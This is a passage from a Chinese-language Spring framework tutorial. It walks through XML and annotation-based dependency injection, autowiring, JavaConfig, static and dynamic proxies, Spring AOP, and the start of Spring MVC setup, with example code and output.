         xsi:schemaLocation="http://www.springframework.org/schema/beans
         http://www.springframework.org/schema/beans/spring-beans.xsd">
  
      <bean id="addr" class="pojo.Address">
          <property name="adress" value="重庆"/>
      </bean>
  
      <bean id="student" class="pojo.Student">
          <!-- 常量注入 -->
          <property name="name" value="小明"/>
          <!-- bean 注入 -->
          <property name="address" ref="addr"/>
          <!-- 数组注入 -->
          <property name="books">
              <array>
                  <value>西游记</value>
                  <value>红楼梦</value>
                  <value>水浒传</value>
              </array>
          </property>
          <!-- list注入 -->
          <property name="hobbys">
              <list>
                  <value>打游戏</value>
                  <value>听歌</value>
              </list>
          </property>
          <!-- Map注入 -->
          <property name="card">
              <map>
                  <entry key="中国邮政" value="111111"/>
                  <entry key="建设" value="22222222"/>
              </map>
          </property>
          <!--  set 注入 -->
          <property name="games">
              <set>
                  <value>111</value>
                  <value>222</value>
              </set>
          </property>
          <!-- Null注入 -->
          <property name="wife">
              <null/>
          </property>
          <!-- Properties注入 -->
          <property name="info">
              <props>
                  <prop key="学号">123456</prop>
                  <prop key="性别">男</prop>
              </props>
          </property>
      </bean>
  
  </beans>
  ```

  测试：

  ```java
  import org.springframework.context.support.ClassPathXmlApplicationContext;
  import pojo.Student;
  
  public class Test {
      public static void main(String[] args) {
          ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("bean.xml");
          Student student = (Student) context.getBean("student");
          student.show();
      }
  }
  ```

  输出

  ```txt
  name=小明,address=重庆,books=
  <<西游记>>	<<红楼梦>>	<<水浒传>>	
  爱好:[打游戏, 听歌]
  card:{中国邮政=111111, 建设=22222222}
  games:[111, 222]
  wife:null
  info:{学号=123456, 性别=男}
  ```

#### p 命名和c命名注入

 User.java

```java
public class User {
     private String name;
     private int age;
 
     public void setName(String name) {
         this.name = name;
    }
 
     public void setAge(int age) {
         this.age = age;
    }
 
     @Override
     public String toString() {
         return "User{" +
                 "name='" + name + '\'' +
                 ", age=" + age +
                 '}';
    }
 }
```

1、P命名空间注入 : 需要在头文件中加入约束文件

  ```xml
 导入约束 : xmlns:p="http://www.springframework.org/schema/p"
 
 <!--P(属性: properties)命名空间 , 属性依然要设置set方法-->
 <bean id="user" class="com.kuang.pojo.User" p:name="狂神" p:age="18"/>
  ```

2、c 命名空间注入 : 需要在头文件中加入约束文件

```xml
导入约束 : xmlns:c="http://www.springframework.org/schema/c"
 <!--C(构造: Constructor)命名空间 , 属性依然要设置set方法-->
 <bean id="user" class="com.kuang.pojo.User" c:name="狂神" c:age="18"/>
```

发现问题：爆红了，刚才我们没有写有参构造！

解决：把有参构造器加上，这里也能知道，c 就是所谓的构造器注入！

```java
@Test
 public void test02(){
     ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
     User user = (User) context.getBean("user");
     System.out.println(user);
 }
```

#### Bean作用域

在Spring中，那些组成应用程序的主体及由Spring IoC容器所管理的对象，被称之为bean。简单地讲，bean就是由IoC容器初始化、装配及管理的对象 .

![image-20220108161636273](img/image-20220108161636273.png)

几种作用域中，request、session作用域仅在基于web的应用中使用（不必关心你所采用的是什么web应用框架），只能用在基于web的Spring ApplicationContext环境。

#### Bean自动装配

自动装配是使用Spring满足bean依赖的一种方法

Spring会在应用上下文中为某个bean寻找其依赖的 bean。

Spring中 bean 有三种装配机制，分别是：

1. 在xml 中显式配置
2. 在 java 中显式配置
3. 隐式的bean发现机制和自动装配

主要说第三种，自动装配的 bean

Spring自动装配需要两个角度来实现：

1. 组件扫描(component scaning): spring 会自动发现应用下文中所创建的 bean
2. 自动装配(autowiring) : spring自动满足 bean 之间的依赖，也就是我们说的 IOC/DI。

组件扫描和自动装配组合发挥巨大威力，使得显示的配置降到最低。

新建项目

新建实体类

```java
package pojo;

public class Cat {
    public void shout(){
        System.out.println("猫叫");
    }
}
```

```java
package pojo;

public class Dog {
    public void shout(){
        System.out.println("狗叫");
    }
}
```

```java
package pojo;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@AllArgsConstructor
@NoArgsConstructor
public class User {
    private Cat cat;
    private Dog dog;
    private String str;

}

```

编写 spring 配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>spring2</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.3.13</version>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <version>1.18.22</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project>
```

测试

```java
import org.springframework.context.support.ClassPathXmlApplicationContext;
import pojo.User;

public class Test {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:bean.xml");
        User user = (User) context.getBean("user");
        user.getCat().shout();
        user.getDog().shout();
    }
}
```

正常

##### byName

**autowire byName (按名称自动装配)**

由于在手动配置xml过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。

采用自动装配将避免这些错误，并且使配置简单化。

测试：

1、修改bean配置，增加一个属性  autowire="byName"

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="cat" class="pojo.Cat"/>
    <bean id="dog" class="pojo.Dog"/>
    <bean id="user" class="pojo.User" autowire="byName">
        <property name="str" value="spring autowire"/>
    </bean>
</beans>
```

测试成功。

将cat 的 id 修改， `cat1` ,测试失败， 执行时报空指针java.lang.NullPointerException。因为按byName规则找不对应set方法，真正的setCat就没执行，对象就没有初始化，所以调用时就会报空指针错误。

**小结：**

当一个bean节点带有 autowire byName的属性时。

1. 将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。
2. 去spring容器中寻找是否有此字符串名称id的对象。
3. 如果有，就取出注入；如果没有，就报空指针异常。

##### byType

**autowire byType 按类型自动装配**

使用autowire byType首先需要保证：同一类型的对象，在spring容器中唯一。如果不唯一，会报不唯一的异常。

```
NoUniqueBeanDefinitionException
```

测试

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="xxx" class="pojo.Cat"/>
    <bean id="dog" class="pojo.Dog"/>
    <bean id="user" class="pojo.User" autowire="byType">
        <property name="str" value="spring autowire"/>
    </bean>
</beans>
```

测试成功。

测试

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="cat" class="pojo.Cat"/>
    <bean id="xxx" class="pojo.Cat"/>
    <bean id="dog" class="pojo.Dog"/>
    <bean id="user" class="pojo.User" autowire="byType">
        <property name="str" value="spring autowire"/>
    </bean>
</beans>
```

报错：NoUniqueBeanDefinitionException

#### 使用注解开发

在spring4之后，想要使用注解形式，必须得要引入aop的包

```xml
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-aop</artifactId>
            <version>5.3.13</version>
        </dependency>
```

在配置文件中，还要引入一个 context 约束

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd
       http://www.springframework.org/schema/context
       http://www.springframework.org/schema/context/spring-context.xsd">

    <bean id="xxx" class="pojo.Cat"/>
    <bean id="dog" class="pojo.Dog"/>
    <bean id="user" class="pojo.User" autowire="byType">
        <property name="str" value="spring autowire"/>
    </bean>
</beans>
```

##### Bean的实现

我们之前都是使用 bean 的标签进行bean注入，但是实际开发中，我们一般都会使用注解.

1. 配置扫描哪些包下的注解

   ```xml
   <!-- 指定注解扫描包 -->
   <context:component-scan base-package="pojo"/>
   ```

2. 在指定包下编写类，增加注解

   ```xml
   package pojo;
   
   import org.springframework.stereotype.Component;
   
   @Component("person")
   // 相当于配置文件中的 <bean id="person" class="xxx"/>
   public class Person {
       public String name = "yanmie";
   
   }
   ```

3. 测试

   ```java
   import org.springframework.context.support.ClassPathXmlApplicationContext;
   import pojo.Person;
   
   public class Test {
       public static void main(String[] args) {
           ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:bean.xml");
           Person person = (Person) context.getBean("person");
           System.out.println(person.name);
       }
   }
   
   ```

4. 输出

   ```txt
   yanmie
   ```

##### 属性注入

使用注解注入属性

1. 可以不用set方法，直接在名上添加 `@Value("值")`

   ```java
   package pojo;
   
   import org.springframework.beans.factory.annotation.Value;
   import org.springframework.stereotype.Component;
   
   @Component("person")
   // 相当于配置文件中的 <bean id="person" class="xxx"/>
   public class Person {
       @Value("hello")
       public String name = "yanmie";
   
   }
   ```

2. 如果有set方法，则在 set方法上添加 `@Value("xxx")`

   ```java
   package pojo;
   
   import org.springframework.beans.factory.annotation.Value;
   import org.springframework.stereotype.Component;
   
   @Component("person")
   // 相当于配置文件中的 <bean id="person" class="xxx"/>
   public class Person {
       @Value("hello")
       public String name = "yanmie";
   
       @Value("xxx")
       public void setName(String name) {
           this.name = name;
       }
   }
   ```

   输出 xxx

##### 衍生注解

为了更好的分层，Spring可以使用其他三个注解，功能一样。

* @Controller web层
* @Service : service 层
* @Repository: dao层

写上这些注解，就相当于将这个类交给Spring管理装配了！

**作用域**

* @Scope

  * singleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。
  * prototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收

  ```java
  @Controller("user")
  @Scope("prototype")
  public class User {
     @Value("秦疆")
     public String name;
  }
  ```

#### 小结

**XML与注解比较**

- XML可以适用任何场景 ，结构清晰，维护方便
- 注解不是自己提供的类使用不了，开发简单方便

**xml与注解整合开发** ：推荐最佳实践

- xml管理Bean
- 注解完成属性注入
- 使用过程中， 可以不用扫描，扫描是为了类上的注解

```
<context:annotation-config/>  

```

作用：

- 进行注解驱动注册，从而使注解生效
- 用于激活那些已经在spring容器里注册过的bean上面的注解，也就是显示的向Spring注册
- 如果不扫描包，就需要手动配置bean
- 如果不加注解驱动，则注入的值为null！

#### 基于Java类进行配置

JavaConfig 原来是 Spring 的一个子项目，它通过 Java 类的方式提供 Bean 的定义信息，在 Spring4 的版本， JavaConfig 已正式成为 Spring4 的核心功能 。

测试：

1. 编写一个实体类，Dog

   ```java
   package pojo;
   
   import org.springframework.stereotype.Component;
   
   @Component  // 将这个类标注为Spring的一个组件，放到容器中
   public class Dog {
       public String name = "dog";
   }
   
   ```

2. 编写MyConfig配置类

   ```java
   package config;
   
   import org.springframework.context.annotation.Bean;
   import org.springframework.context.annotation.Configuration;
   import pojo.Dog;
   
   @Configuration    // 代表一个配置类
   public class MyConfig {
       @Bean   // 通过方法注册一个bean,这里的返回值就Bean的类型，方法名就是id
       public Dog dog(){
           return new Dog();
       }
   }
   ```

3. 测试

   ```java
   import config.MyConfig;
   import org.springframework.context.annotation.AnnotationConfigApplicationContext;
   import pojo.Dog;
   
   public class Test {
       public static void main(String[] args) {
           AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MyConfig.class);
           Dog dog = (Dog) applicationContext.getBean("dog");
           System.out.println(dog.name);
       }
   }
   ```

4. 成功

**导入其他类如何做**

1. 在编写一个配置类

   ```java
   package config;
   
   import org.springframework.context.annotation.Configuration;
   
   @Configuration    // 代表配置类
   public class MyConfig2 {
   }
   ```

2. 在之前的配置类中导入这个配置类

   ```java
   package config;
   
   import org.springframework.context.annotation.Bean;
   import org.springframework.context.annotation.Configuration;
   import org.springframework.context.annotation.Import;
   import pojo.Dog;
   
   @Configuration    // 代表一个配置类
   @Import(MyConfig2.class)  //导入合并其他配置类，类似于配置文件中的 inculde 标签
   public class MyConfig {
       @Bean   // 通过方法注册一个bean,这里的返回值就Bean的类型，方法名就是id
       public Dog dog(){
           return new Dog();
       }
   }
   ```

   关于这种Java类的配置方式，我们在之后的SpringBoot 和 SpringCloud中还会大量看到，我们需要知道这些注解的作用即可！

## 静态/动态代理模式

**AOP的底层是动态代理**

代理模式：

* 静态代理
* 动态代理

#### 静态代理

角色分析：

* 抽象角色：一般使用接口或者抽象类来实现
* 真实角色：被代理的角色
* 代理角色：代理真实角色；代理真实角色后，一般会做一些附属的操作
* 客户：使用代理角色来进行一些操作

Rent.java 抽象角色

```java
package proxy1;

// 抽象角色 ： 租房
public interface Rent {
    public void rent();
}
```

Host.java  真实角色

```java
package proxy1;

//真实角色: 房东，房东要出租房子
public class Host implements Rent{
   public void rent() {
       System.out.println("房屋出租");
  }
}
```

Proxy.java 代理角色

```java
package proxy1;

// 代理角色： 中介
public class Proxy implements Rent{
    private Host host;
    public Proxy(){}
    public Proxy(Host host) {
        this.host = host;
    }

    // 租房
    @Override
    public void rent() {
        seeHouse();
        host.rent();
        fare();
    }
    // 看房
    public void seeHouse(){
        System.out.println("带房客看房");
    }
    // 收中介费
    public void fare(){
        System.out.println("收中介费");
    }
}
```

Client.java 客户

```java
package proxy1;

// 客户类，一般客户会去找代理
public class Client {
    public static void main(String[] args) {
        // 房东要租房
        Host host = new Host();
        // 中介帮助房东
        Proxy proxy = new Proxy(host);

        // 去找中介
        proxy.rent();
    }
}
```

输出：

```txt
带房客看房
房屋出租
收中介费
```

分析：在这个过程中，你直接接触的就是中介，就如同现实生活中的样子，你看不到房东，但是你依旧租到了房东的房子通过代理，这就是所谓的代理模式，程序源自于生活，所以学编程的人，一般能够更加抽象的看待生活中发生的事情。

**静态代理的好处:**

- 可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .
- 公共的业务由代理来完成 . 实现了业务的分工 ,
- 公共业务发生扩展时变得更加集中和方便 .

缺点 :

- 类多了 , 多了代理类 , 工作量变大了 . 开发效率降低 .

我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !

**我们在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想**

AOP：纵向开发，横向开发

![image-20220108195538549](img/image-20220108195538549.png)

#### 动态代理

- 动态代理的角色和静态代理的一样 .

- 动态代理的代理类是动态生成的 . 静态代理的代理类是我们提前写好的

- 动态代理分为两类 : 一类是基于接口动态代理 , 一类是基于类的动态代理

- - 基于接口的动态代理----JDK动态代理
  - 基于类的动态代理--cglib
  - 现在用的比较多的是 javasist 来生成动态代理 . 百度一下javassist
  - 我们这里使用JDK的原生代码来实现，其余的道理都是一样的！

JDK 的动态代理需要实现两个类

核心： InvocationHandler 和 Proxy

```java
Object invoke(Object proxy, 方法 method, Object[] args)；
//参数
//proxy - 调用该方法的代理实例
//method -所述方法对应于调用代理实例上的接口方法的实例。方法对象的声明类将是该方法声明的接口，它可以是代理类继承该方法的代理接口的超级接口。
//args -包含的方法调用传递代理实例的参数值的对象的阵列，或null如果接口方法没有参数。原始类型的参数包含在适当的原始包装器类的实例中，例如java.lang.Integer或java.lang.Boolean 。
```

```java
//生成代理类
public Object getProxy(){
   return Proxy.newProxyInstance(this.getClass().getClassLoader(),
                                 rent.getClass().getInterfaces(),this);
}
```

代码实现：

Rent . java 即抽象角色

```
//抽象角色：租房
public interface Rent {
   public void rent();
}
```

Host . java 即真实角色

```
//真实角色: 房东，房东要出租房子
public class Host implements Rent{
   public void rent() {
       System.out.println("房屋出租");
  }
}
```

ProxyInvocationHandler. java 即代理角色

```JAVA
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class ProxyInvocationHandler implements InvocationHandler {
    private Rent rent;

    public void setRent(Rent rent) {
        this.rent = rent;
    }
    //生成代理类，重点是第二个参数，获取要代理的抽象角色！之前都是一个角色，现在可以代理一类角色
    public Object getProxy(){
        return Proxy.newProxyInstance(this.getClass().getClassLoader(),rent.getClass().getInterfaces(),this);
    }


    // proxy : 代理类 method : 代理类的调用处理程序的方法对象.
    // 处理代理实例上的方法调用并返回结果
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        seeHouse();
        // 核心：本质利用反射实现
        Object result = method.invoke(rent, args);
        fare();
        return result;
    }

    //看房
    public void seeHouse(){
        System.out.println("带房客看房");
    }
    //收中介费
    public void fare(){
        System.out.println("收中介费");
    }
}

```

测试：

```java
public class Client {
    public static void main(String[] args) {
        // 真实角色
        Host host = new Host();
        // 代理实例的调用处理程序
        ProxyInvocationHandler pih = new ProxyInvocationHandler();
        pih.setRent(host);  // 把真实角色放置进去
        Rent proxy = (Rent) pih.getProxy();  // 动态生成对应的代理类
        proxy.rent();
    }
}
```

核心：**一个动态代理 , 一般代理某一类业务 , 一个动态代理可以代理多个类，代理的是接口！、**

**深化理解**

我们来使用动态代理实现代理我们后面写的UserService！

我们也可以编写一个通用的动态代理实现的类！所有的代理对象设置为Object即可！

```
public class ProxyInvocationHandler implements InvocationHandler {
   private Object target;

   public void setTarget(Object target) {
       this.target = target;
  }

   //生成代理类
   public Object getProxy(){
       return Proxy.newProxyInstance(this.getClass().getClassLoader(),
               target.getClass().getInterfaces(),this);
  }

   // proxy : 代理类
   // method : 代理类的调用处理程序的方法对象.
   public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
       log(method.getName());
       Object result = method.invoke(target, args);
       return result;
  }

   public void log(String methodName){
       System.out.println("执行了"+methodName+"方法");
  }

}
```

测试！

```
public class Test {
   public static void main(String[] args) {
       //真实对象
       UserServiceImpl userService = new UserServiceImpl();
       //代理对象的调用处理程序
       ProxyInvocationHandler pih = new ProxyInvocationHandler();
       pih.setTarget(userService); //设置要代理的对象
       UserService proxy = (UserService)pih.getProxy(); //动态生成代理类！
       proxy.delete();
  }
}
```

测试，增删改查，查看结果！

> ##### 动态代理的好处

静态代理有的它都有，静态代理没有的，它也有！

- 可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .
- 公共的业务由代理来完成 . 实现了业务的分工 ,
- 公共业务发生扩展时变得更加集中和方便 .
- 一个动态代理 , 一般代理某一类业务
- 一个动态代理可以代理多个类，代理的是接口！

**静态代理代理的接口是写死的，只能代理该类接口的实现类，实现其对应的方法，真实角色都属于同一类，动态代理通过反射获取被代理对象的接口类型，所以代理的对象可以是任意的，代理类都可以通过反射获取接口类型，被代理对象的方法也可以通过反射获取，所以动态代理相比静态代理最大的区别就是能够代理的类型可以是任意（Object）的，而静态代理只能代理一类对象（实现相同的接口），静态代理实现了和被代理类相同的接口，而动态代理实现的是InvocationHandler ，可以通过反射实现任意类型的接口，更具灵活性。**

## Spring-AOP篇

AOP（Aspect Oriented  Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。

AOP在Spring中的作用，：

提供声明式事务，允许用户自定义切面。

* 横切关注点：跨越应用程序多个模块的方法和功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点，如日志，安全，缓存，事务等等。
* 切面(ASPECT)：横切关注点，被模块化的特殊对象，即它是类中的一个方法。
* 通知(Advice)：切面必须要完成的工作。即，它是类中的一个方法。
* 目标(Target)：被通知对象。
* 代理(Proxy)：向目标对象应用通知之后创建的对象。
* 切入点(PointCut)：切面通知执行的地点的定义。
* 连接点(JointPoint)：与切入点匹配的执行点。

SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice:

![image-20220110100851882](img/image-20220110100851882.png)

AOP在不改变原有代码的情况下，去增加新的功能。

#### 实现

导入依赖

```xml
    <dependencies>
        <!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver -->
        <dependency>
            <groupId>org.aspectj</groupId>
            <artifactId>aspectjweaver</artifactId>
            <version>1.9.7</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-aop</artifactId>
            <version>5.3.13</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.3.13</version>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <version>1.18.22</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13</version>
            <scope>test</scope>
        </dependency>

    </dependencies>
```

编写Service

```java
public interface UserService {
    public void add();
    public void delete();
    public void update();
    public void search();
}
```

```java
public class UserServiceImpl implements UserService{
    @Override
    public void add() {
        System.out.println("增加用户");
    }

    @Override
    public void delete() {
        System.out.println("删除用户");
    }

    @Override
    public void update() {
        System.out.println("更新用户");
    }

    @Override
    public void search() {
        System.out.println("搜索用户");
    }
}
```

编写增强类，一个前置增强，一个后置增强

```java
import org.springframework.aop.MethodBeforeAdvice;

import java.lang.reflect.Method;

public class Log implements MethodBeforeAdvice {
    // method: 要执行的目标对象的方法
    // args: 被调用的方法的参数
    // target: 目标对象
    @Override
    public void before(Method method, Object[] args, Object target) throws Throwable {
        System.out.println(target.getClass().getName() + "的" + method.getName() + "方法被执行了");
    }
}
```

```java
import org.springframework.aop.AfterReturningAdvice;

import java.lang.reflect.Method;

public class AfterLog implements AfterReturningAdvice {
    // returnValue: 返回值
    // method: 被调用的方法
    // args: 被调用的方法的参数
    // target: 被调用的目标对象
    @Override
    public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable {
        System.out.println("执行了" + target.getClass().getName() + "的" + method.getName() + "方法," + "返回值"+returnValue);
    }
}
```

编写spring配置文件

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:aop="http://www.springframework.org/schema/aop"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd
       http://www.springframework.org/schema/aop
       http://www.springframework.org/schema/aop/spring-aop.xsd">

    <!--注册bean-->
    <bean id="userService" class="UserServiceImpl" />
    <bean id="log" class="Log"/>
    <bean id="afterLog" class="AfterLog"/>

    <!--aop的配置-->
   <aop:config>
       <!-- 切入点 expression:表达式匹配要执行的方法 -->
       <aop:pointcut id="pointcut" expression="execution(* UserServiceImpl.*(..))"/>
       <!--执行环绕; advice-ref执行方法 . pointcut-ref切入点-->
       <aop:advisor advice-ref="log" pointcut-ref="pointcut"/>
       <aop:advisor advice-ref="afterLog" pointcut-ref="pointcut"/>
   </aop:config>

</beans>
```

测试：

```java
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class Test {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring.xml");
        UserService userService = (UserService) context.getBean("userService");
        userService.search();
    }
}
```

输出：

```
UserServiceImpl的search方法被执行了
搜索用户
执行了UserServiceImpl的search方法,返回值null
```

Spring的AOP就是将公共业务（日志、安全等）和领域业务结合起来，当执行领域业务时，将会把公共业务加进来，实现公共业务的重复利用。

领域业务更纯粹 , 程序猿专注领域业务 , 其本质还是动态代理

**第二种方式**

自定义类实现AOP

目标业务不变

先写切入类

```java
public class DiyPointcut {
    public void before(){
        System.out.println("----方法执行前----");
    }
    public void after(){
        System.out.println("----方法执行后----");
    }
}
```

去配置文件配置

```xml

```

```
<!--- 注册bean-->
<bean id="userService" class="UserServiceImpl" />
<bean id="diy" class="DiyPointcut"/>
<!--- aop配置 -->
<aop:config>
    <!-- 使用AOP的标签来实现 -->
    <aop:aspect ref="diy">
        <aop:pointcut id="diyPointcut" expression="execution(* UserServiceImpl.*(..))"/>
        <aop:before pointcut-ref="diyPointcut" method="before"/>
        <aop:after pointcut-ref="diyPointcut" method="after"/>
    </aop:aspect>
</aop:config>
```

测试：

```java
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class Test2 {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring.xml");
        UserService userService = (UserService) context.getBean("userService");
        userService.search();
    }
}
```

输出：

```
----方法执行前----
搜索用户
----方法执行后----
```

**第三种方式**

使用注解实现

编写增强类

```java
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

@Aspect
public class AnnotationPointcut {
    @Before("execution(* UserServiceImpl.*(..))")
    public void before(){
        System.out.println("----方法执行前----");
    }
    @After("execution(* UserServiceImpl.*(..))")
    public void after(){
        System.out.println("方法执行后");
    }
    @Around("execution(* UserServiceImpl.*(..))")
    public void aroud(ProceedingJoinPoint jp) throws Throwable {
        System.out.println("环绕前");
        System.out.println("签名："+jp.getSignature());
        // 执行目标 proceed
        Object proceed = jp.proceed();
        System.out.println("环绕后");
        System.out.println(proceed);
    }
}
```

编写spring.xml

```xml
    <bean id="userService" class="UserServiceImpl" />
    <bean id="annotationPointcut" class="AnnotationPointcut"/>
    <aop:aspectj-autoproxy/>
```

测试

```java
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class Test3 {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring.xml");
        UserService userService = (UserService) context.getBean("userService");
        userService.search();
    }
}
```

输出：

```
环绕前
签名：void UserService.search()
----方法执行前----
搜索用户
方法执行后
环绕后
null
```

aop:aspectj-autoproxy：说明

```txt
通过aop命名空间的<aop:aspectj-autoproxy />声明自动为spring容器中那些配置@aspectJ切面的bean创建代理，织入切面。
当然，spring 在内部依旧采用AnnotationAwareAspectJAutoProxyCreator进行自动代理的创建工作，但具体实现的细节已经被<aop:aspectj-autoproxy />隐藏起来了

<aop:aspectj-autoproxy />有一个proxy-target-class属性，默认为false，表示使用jdk动态代理织入增强，
当配为<aop:aspectj-autoproxy  poxy-target-class="true"/>时，表示使用CGLib动态代理技术织入增强。不过即使proxy-target-class设置为false，
如果目标类没有声明接口，则spring将自动使用CGLib动态代理。
```

## Spring整合Mybatis

https://www.cnblogs.com/henuliulei/p/14613153.html

## Spring MVC篇

#### 概述

SpringMVC是一种基于Java代码实现的MVC设计模型的请求驱动类型的轻量级WEB框架。

SpringMVC属于SpringFrameWork的后续产品，已经融合在SpringWebFlow里面，Spring框架提供了构建Web应用程序的全功能的MVC模块。

使用Spring可查入的MVC架构，从而在使用Spring进行Web开发时，可以选择使用Spring的SpringMVC框架或集成其他MVC开发框架，如Struts2,Struts2等。

pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>spring-mvc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.12</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.1.9.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.2</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.2</version>
        </dependency>

    </dependencies>

    <build>
        <resources>
            <resource>
                <directory>src/main/java</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
            <resource>
                <directory>src/main/resources</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
        </resources>
    </build>



</project>
```

#### 配置版

添加web应用程序框架支持

配置 web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
